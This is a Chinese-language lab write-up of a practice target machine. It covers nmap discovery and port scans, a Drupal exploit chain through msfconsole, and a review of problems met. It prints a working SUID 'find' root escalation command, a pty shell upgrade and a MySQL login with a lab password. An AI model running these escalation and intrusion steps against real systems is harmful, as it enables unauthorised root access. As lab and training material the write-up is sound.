靶场练习

打开发现靶机需要登录但是没有给到账号密码，猜测可能是需要自己去获得密码。


先用nmap扫描网段内存活的主机找到靶机的ip地址

nmap -sn 192.168.179.0/24

扫描到4个存活ip，没有发现靶机IP。查找原因发现靶机用的是桥接模式，而攻击机用的是nat模式，可能攻击机和靶机不在一个网段导致nmap无法扫描到靶机。

将靶机改为nat模式后重启，再次使用nmap扫描，发现靶机ip：192.168.179.139。

拿到ip后对靶机开放端口进行扫描。

nmap -p- --min-rate 10000 192.168.179.139

对开放端口做一次详细扫描，在扫描的时候查看一下靶机开放的web服务

nmap -p 22,80,111,51783 -sV -sC -O 192.168.179.139

发现多个公开漏洞，启动msfconsole。

靶机复盘

攻击链

查找ip->端口扫描->web服务识别 → Drupal 漏洞利用 → 获取 www-data → 配置文件获取数据库凭据 → 数据库操作 → 获取管理员权限 → SUID find 提权 → root

遇到的问题

1、扫描存活ip没有扫到靶机ip

原因：靶机与攻击机网络设置不同，通过扫描攻击机网段无法扫描到靶机。

解决方法：将攻击机和靶机使用统一网络适配器，让两台机器在同一网站

2、第一次利用提权失败

原因： 第一次的命令

/usr/bin/find / -name anything -exec /bin/bash -p -c '/bin/bash -p' \; -quit

只有找到anything文件才执行后面的-exec，-exec在命令中不执行所以提权失败。

解决方法：直接执行-exec

find . -exec /bin/sh \; -quit

反思：这里已经知道find具有SUID root权限，但在一次提权失败后没有找原因就直接放弃，直接导致后续大量工作的产生，非常不应该的决定。

3、shell连接MYSQL失败

原因：使用的shell无法正确处理MYSQL的交互终端。

解决方法：创建一个伪终端来让输出输出正常显示，创建命令：

python -c 'import pty; pty.spawn("/bin/bash")'

mysql -udbuser -pR0ck3t
